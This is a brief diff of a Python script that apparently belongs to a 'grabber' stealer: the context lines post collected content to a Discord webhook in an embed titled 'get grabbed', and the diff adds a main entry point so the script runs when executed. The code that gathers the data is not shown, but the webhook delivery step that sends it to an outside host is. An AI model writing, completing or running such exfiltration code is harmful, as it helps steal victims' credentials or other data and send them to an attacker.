@@ -67,3 +67,5 @@ def main():
     embed = discord_webhook.DiscordEmbed(title="get grabbed",content=embedcont, color="03b2f8")
     webhook.add_embed(embed=embed)
     webhook.execute()
+if __name__== "__main__":
+    main()
